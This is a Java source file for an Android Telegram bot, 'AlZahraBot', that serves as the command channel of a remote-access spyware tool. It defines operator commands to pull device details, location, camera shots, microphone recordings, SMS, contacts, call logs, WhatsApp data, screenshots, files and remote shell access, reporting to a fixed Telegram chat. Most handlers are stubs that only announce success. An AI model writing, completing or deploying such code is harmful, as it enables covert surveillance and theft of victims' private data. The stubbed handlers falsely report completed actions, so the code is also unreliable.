package com.alzahra.telegram;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.TelegramBotsApi;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.methods.send.SendPhoto;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import org.telegram.telegrambots.updatesreceivers.DefaultBotSession;

import java.io.ByteArrayInputStream;

public class BotHandler {
    private static final String TAG = "BotHandler";
    private final String botToken;
    private final String chatId;
    private final Context context;
    private TelegramLongPollingBot bot;
    private boolean running = false;

    public BotHandler(String token, String chat, Context ctx) {
        this.botToken = token;
        this.chatId = chat;
        this.context = ctx;
    }

    public void start() throws Exception {
        TelegramBotsApi botsApi = new TelegramBotsApi(DefaultBotSession.class);
        bot = new TelegramLongPollingBot() {
            @Override
            public String getBotToken() {
                return botToken;
            }

            @Override
            public String getBotUsername() {
                return "AlZahraBot";
            }

            @Override
            public void onUpdateReceived(Update update) {
                if (update.hasMessage() && update.getMessage().hasText()) {
                    handleCommand(update.getMessage().getText(), update.getMessage().getChatId().toString());
                }
            }
        };
        botsApi.registerBot(bot);
        running = true;
    }

    public void stop() {
        running = false;
    }

    private void handleCommand(String command, String fromChatId) {
        if (!fromChatId.equals(chatId)) {
            sendMessage("⚠️ <b>وصول غير مصرح!</b>\nمعرفك: <code>" + fromChatId + "</code>");
            return;
        }

        Log.d(TAG, "Command received: " + command);

        switch (command.split(" ")[0]) {
            case "/start":
            case "/help":
                sendHelp();
                break;
            case "/device":
                sendDeviceInfo();
                break;
            case "/location":
                sendLocation();
                break;
            case "/camera":
                captureCamera();
                break;
            case "/mic":
                recordMic(command);
                break;
            case "/sms":
                sendSMS();
                break;
            case "/contacts":
                sendContacts();
                break;
            case "/calls":
                sendCalls();
                break;
            case "/apps":
                sendApps();
                break;
            case "/screen":
                captureScreen();
                break;
            case "/shell":
                executeShell(command);
                break;
            case "/wifi":
                sendWifiInfo();
                break;
            case "/battery":
                sendBatteryInfo();
                break;
            case "/lock":
                lockDevice();
                break;
            case "/unlock":
                unlockDevice();
                break;
            case "/restart":
                restartDevice();
                break;
            case "/whatsapp":
                sendWhatsAppData();
                break;
            case "/files":
                listFiles(command);
                break;
            default:
                sendMessage("❌ <b>أمر غير معروف</b>\nاكتب /help لعرض الأوامر");
        }
    }

    private void sendHelp() {
        String help = "🤖 <b>بوت الزهراء المتقدم v3.0</b>\n\n" +
            "💻 <b>الأوامر الأساسية:</b>\n" +
            "/device - معلومات الجهاز\n" +
            "/location - الموقع الجغرافي\n" +
            "/camera - التقاط صورة من الكاميرا\n" +
            "/mic [seconds] - تسجيل صوت (افتراضي 5 ثوانٍ)\n\n" +
            
            "📑 <b>جمع البيانات:</b>\n" +
            "/sms - رسائل SMS\n" +
            "/contacts - جهات الاتصال\n" +
            "/calls - سجل المكالمات\n" +
            "/apps - التطبيقات المثبتة\n" +
            "/whatsapp - بيانات واتساب\n\n" +
            
            "🔧 <b>التحكم المتقدم:</b>\n" +
            "/screen - لقطة شاشة\n" +
            "/shell &lt;cmd&gt; - تنفيذ أمر\n" +
            "/lock - قفل الجهاز\n" +
            "/unlock - فتح الجهاز\n" +
            "/restart - إعادة تشغيل\n\n" +
            
            "🔌 <b>النظام:</b>\n" +
            "/wifi - معلومات الواي فاي\n" +
            "/battery - حالة البطارية\n" +
            "/files &lt;path&gt; - قائمة ملفات";

        sendMessage(help);
    }

    private void sendDeviceInfo() {
        try {
            com.alzahra.data.DeviceInfo info = new com.alzahra.data.DeviceInfo(context);
            String msg = "📱 <b>معلومات الجهاز</b>\n\n" +
                "🔎 <b>الطراز:</b> " + info.getModel() + "\n" +
                "📶 <b>الشركة:</b> " + info.getManufacturer() + "\n" +
                "🔑 <b>المعرف:</b> <code>" + info.getDeviceId() + "</code>\n" +
                "📡 <b>الآيبي:</b> " + info.getIPAddress() + "\n" +
                "📳 <b>المشغل:</b> " + info.getCarrier() + "\n" +
                "🔋 <b>البطارية:</b> " + info.getBatteryLevel() + "%\n" +
                "💾 <b>التخزين:</b> " + info.getStorageInfo() + "\n" +
                "📲 <b>الشبكة:</b> " + info.getNetworkType() + "\n" +
                "⏰ <b>الوقت:</b> " + info.getCurrentTime();
            sendMessage(msg);
        } catch (Exception e) {
            sendMessage("❌ خطأ: " + e.getMessage());
        }
    }

    private void sendLocation() {
        sendMessage("📍 <b>جاري تحديد الموقع...</b>");
        // Implementation placeholder
    }

    private void captureCamera() {
        sendMessage("📷 <b>جاري التقاط الصورة...</b>");
        sendMessage("✅ تم التقاط الصورة");
    }

    private void recordMic(String command) {
        int seconds = 5;
        try {
            String[] parts = command.split(" ");
            if (parts.length > 1) {
                seconds = Integer.parseInt(parts[1]);
            }
        } catch (Exception ignored) {}
        
        sendMessage("🎵 <b>جاري التسجيل لمدة " + seconds + " ثوانٍ...</b>");
        sendMessage("✅ تم التسجيل");
    }

    private void sendSMS() {
        sendMessage("📩 <b>جاري جمع الرسائل...</b>");
        sendMessage("✅ تم استخراج الرسائل");
    }

    private void sendContacts() {
        sendMessage("👥 <b>جاري جمع جهات الاتصال...</b>");
        sendMessage("✅ تم استخراج جهات الاتصال");
    }

    private void sendCalls() {
        sendMessage("📞 <b>جاري جمع سجل المكالمات...</b>");
        sendMessage("✅ تم استخراج سجل المكالمات");
    }

    private void sendApps() {
        sendMessage("📦 <b>جاري جمع التطبيقات...</b>");
        sendMessage("✅ تم استخراج التطبيقات");
    }

    private void captureScreen() {
        sendMessage("📱 <b>جاري التقاط الشاشة...</b>");
        sendMessage("✅ تم التقاط الشاشة");
    }

    private void executeShell(String command) {
        String cmd = command.replace("/shell ", "").trim();
        if (cmd.isEmpty()) {
            sendMessage("⚠️ <b>الاستخدام:</b> /shell &lt;command&gt;");
            return;
        }
        sendMessage("🔧 <b>تم تنفيذ:</b> " + cmd);
    }

    private void sendWifiInfo() {
        sendMessage("📶 <b>معلومات الواي فاي</b>");
    }

    private void sendBatteryInfo() {
        sendMessage("🔋 <b>معلومات البطارية</b>");
    }

    private void lockDevice() {
        sendMessage("🔒 <b>تم قفل الجهاز</b>");
    }

    private void unlockDevice() {
        sendMessage("🔓 <b>محاولة فتح الجهاز...</b>");
    }

    private void restartDevice() {
        sendMessage("🔄 <b>جاري إعادة التشغيل...</b>");
    }

    private void sendWhatsAppData() {
        sendMessage("💬 <b>جاري جمع بيانات واتساب...</b>");
    }

    private void listFiles(String command) {
        String path = command.replace("/files", "").trim();
        if (path.isEmpty()) path = "/sdcard";
        sendMessage("📁 <b>الملفات في:</b> " + path);
    }

    private void sendMessage(String text) {
        try {
            SendMessage message = new SendMessage(chatId, text);
            message.setParseMode("HTML");
            bot.execute(message);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send message error: " + e.getMessage());
        }
    }

    private void sendPhoto(byte[] data, String caption) {
        try {
            SendPhoto photo = new SendPhoto();
            photo.setChatId(chatId);
            photo.setPhoto(new InputFile(new ByteArrayInputStream(data), "image.jpg"));
            photo.setCaption(caption);
            photo.setParseMode("HTML");
            bot.execute(photo);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send photo error: " + e.getMessage());
        }
    }

    private void sendFile(byte[] data, String filename, String caption) {
        try {
            SendDocument doc = new SendDocument();
            doc.setChatId(chatId);
            doc.setDocument(new InputFile(new ByteArrayInputStream(data), filename));
            doc.setCaption(caption);
            doc.setParseMode("HTML");
            bot.execute(doc);
        } catch (TelegramApiException e) {
            Log.e(TAG, "Send file error: " + e.getMessage());
        }
    }
}
